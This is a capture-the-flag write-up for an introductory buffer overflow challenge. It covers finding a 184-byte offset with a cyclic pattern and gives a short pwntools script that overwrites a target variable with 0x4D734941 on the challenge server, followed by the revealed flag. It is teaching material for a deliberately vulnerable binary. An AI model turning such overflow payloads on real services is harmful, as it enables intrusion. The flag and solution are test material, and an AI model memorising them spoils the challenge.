# Buffer Overflow Introduction Write-up

## Challenge Information

**Title:** Intro to Pwning   
**Description:** Welcome to the challenge, I hope you enjoy playing this CTF and learn a lot about Cyber Security in the end. The challenge is simple, overwrite the variable target and once the value is changed as intended, you will get the flag. You can try playing around with the given binary first, then once you have the solver you can try doing it on the given netcat server. GHLF!!  
**Connection:** `nc ctf.m4.lu 65319`

## Challenge Analysis

This challenge is a basic binary exploitation challenge focusing on **buffer overflow** fundamentals.

## Reconnaissance and Offset Discovery

### Finding the Buffer Overflow Offset

![](<img/1.png>)

For reconnaissance, I used `pwn cyclic -200` to generate a cyclic pattern and input it into the program. Instead of just receiving a segmentation fault, the program directly displayed the buffer overflow offset.

![](<img/2.png>)

**Discovered offset:** 184 bytes

### Target Value Identification

![](<img/3.png>)

The target hex value that needs to be written is: `0x4D734941` (from the C source code)

## Exploitation

### Buffer Overflow Concept

The vulnerability allows us to:
1. Fill the buffer with 184 bytes of padding
2. Overwrite the target variable with the specific hex value `0x4D734941`
3. Trigger the flag display when the target variable contains the expected value

### Solution Script

```python
from pwn import *

r = remote("ctf.m4.lu", 65319)
# r = process('./chall')  # for local testing

r.recvuntil(b"Enter your input:")
r.sendline(b"A" * 184 + p64(0x4D734941))
print(r.recvall(timeout=2).decode(errors="ignore"))
```

### Payload Breakdown

- **`"A" * 184`:** Padding to reach the target variable
- **`p64(0x4D734941)`:** The specific value needed to overwrite the target variable
- The `p64()` function packs the value as a 64-bit little-endian integer

## Flag

```
HiB25{1ntr0DUct1On_T0_th3_w0rld_0f_PWN}
```

## Summary

This introductory challenge demonstrated:

1. **Buffer Overflow Basics** - Understanding how input can overflow into adjacent memory
2. **Offset Calculation** - Finding the exact number of bytes needed to reach the target
3. **Memory Overwriting** - Precisely controlling what value gets written to the target variable
4. **Pwntools Usage** - Using the pwntools library for exploit development
5. **Remote Exploitation** - Applying the same technique to a remote service

This challenge serves as an excellent introduction to binary exploitation, teaching the fundamental concept of buffer overflows in a controlled environment. The descriptive flag name perfectly captures the educational nature of this challenge - it's truly an introduction to the world of pwning (binary exploitation).